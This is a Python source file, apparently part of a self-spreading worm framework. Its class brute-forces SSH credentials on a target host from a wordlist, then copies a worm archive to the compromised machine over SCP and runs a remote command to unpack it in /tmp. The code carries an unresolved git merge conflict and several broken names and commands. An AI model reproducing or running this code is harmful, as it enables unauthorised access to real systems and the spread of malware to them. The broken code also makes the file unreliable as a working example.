from .abstract import Abstract
import paramiko
from scp import scpClient
import tarfile
import os

class Attaque(Abstract):
    def __init__(self, ref, host, port):
        Abstract.__init__(self, ref, host, port)
    
    def run(self):
        client = paramiko.SSHClient()
        with open("framworm/files/wordlists/rockworm.txt", "r") as wordlist:
            words = wordlist.readlines()
            for user in words:
                user = user.strip()
                for passwd in words:
                    passwd = passwd.strip()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
<<<<<<< HEAD
                        self.info(f"Try to connect with ssh to {self.host}:{self.port} with user={user},password={passwd}")
=======
                        
>>>>>>> 1d8dcf56045037471d62c44cb39877d9fa0633ff
                        client.connect(self.host, port=self.port, username=user, password=passwd)
                        with scpClient(client.get_transport()) as scp:
                            self.sendworm("w0rm.tar.gz", ".", scp)
                        stdin, stdout, stderr = client.exec_command("mkdir /tmp/w0rm; cd /tmp/w0rm; tar -xf /tmp/w0rm.tar.gz; rm python3 /tmp/w0rm/framworm/main.py")
                        client.close()
                        self.bilan(f"ssh_bruteforce{[self.host, user, passwd]}")

                    except:
                        pass

    def send_worm(self, output_filename, source_dir, scp_t):
        try:
            scp_t.put(output_filename, recursive=True, remote_path="/tmp/w0rm")
        except Exception as e:
            print(e)
            with tarfile.open(output_filename, "w:gz") as tar:
                tar.add(source_dir, arcname=os.path.basename(source_dir))
            scp_t.put(output_filename, recursive=True, remote_path="/tmp/w0rm")
        self.bilan(f"{output_filename} created.")